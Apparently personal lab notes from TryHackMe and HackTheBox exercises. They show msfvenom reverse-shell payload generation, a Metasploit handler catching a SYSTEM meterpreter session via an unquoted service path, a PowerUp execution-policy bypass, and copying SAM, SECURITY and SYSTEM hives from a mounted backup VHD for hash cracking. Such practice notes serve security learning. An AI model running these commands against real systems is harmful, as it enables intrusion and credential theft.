msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.13.13.125
lhost => 10.13.13.125
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thr
                                        ead, process, none)
   LHOST     10.13.13.125     yes       The listen address (an interface may b
                                        e specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > 

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.13.13.125 LPORT=4444 -f exe -o common.exe		# getting new shell code in difference window
msfvenom -p windows/shell/reverse_tcp LHOST=10.13.13.125 LPORT=4444 -f exe -o common.exe					# how to do without meterpreter, just use nc.exe instead.

┌──(root㉿kali)-[/home/kali/Documents/transfer]														# hosting up http server to put common.exe shellcode on attack box.
└─# python3 -m http.server                                                                        
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...


C:\Program Files\Unquoted Path Service																# saving common.exe in this location

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\user>sc start unquotedsvc																	# started unquotedsvc on windows victim machine.


msf6 exploit(multi/handler) > run																	# caught shellcode on kali machine, we are now system baby.

[*] Started reverse TCP handler on 10.13.13.125:4444 
[*] Sending stage (175686 bytes) to 10.10.103.83
[*] Meterpreter session 2 opened (10.13.13.125:4444 -> 10.10.103.83:49313) at 2023-01-20 21:39:01 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 


https://tryhackme.com/room/steelmountain														#unquoted service path practice


set payload windows/x64/meterpreter/reverse_tcp

Powerup -ep bypass .\PowerUp.ps1																				# Invoke-Allchecks, - execute bypass as well as runs the file



5:50 PM 1/23/2023																														# SMB VHD MAPPING  process - refer to Bation -HTB notes for more details
┌──(root㉿kali)-[/]
└─# mount -t cifs -o 'rw,username=guest' //10.10.10.134/Backups backups
Password for guest@//10.10.10.134/Backups: 

┌──(root㉿kali)-[/backups]																							# successfully mapped
└─# ls
note.txt  SDT65CB.tmp  test.txt  WindowsImageBackup


5:54 PM 1/23/2023																									# 
┌──(root㉿kali)-[/backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351]
└─# ls  
9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd



6:26 PM 1/23/2023																										# command to mount to vhd files
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# guestmount -a /backups/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd -m /dev/sda1 --ro /home/kali/Documents/hackthebox/bastion/ -o nonempty 


──(root㉿kali)-[/home/kali/Documents/transfer]																			# have to cd in the terminal that was used to mount or the drive will not show
└─# cd /home/kali/Documents/hackthebox/bastion/
                                                                                                                      
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/bastion]
└─# ls
'$Recycle.Bin'   config.sys                pagefile.sys   ProgramData      Recovery                     Users
 autoexec.bat   'Documents and Settings'   PerfLogs      'Program Files'  'System Volume Information'   Windows
                                                                                                                      
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/bastion]
└─#    

6:38 PM 1/23/2023																										# copied SAM/SECURITY/SYSTEM INTO new /home/kali/Documents/hackthebox/SAM directory to break the hashes with SAM.
┌──(root㉿kali)-[/home/…/bastion/Windows/System32/config]
└─# cp SAM /home/kali/Documents/hackthebox/SAM
                                                                                                                      
┌──(root㉿kali)-[/home/…/bastion/Windows/System32/config]
└─# cp SECURITY /home/kali/Documents/hackthebox/SAM
                                                                                                                      
┌──(root㉿kali)-[/home/…/bastion/Windows/System32/config]
└─# cp SYSTEM /home/kali/Documents/hackthebox/SAM
```
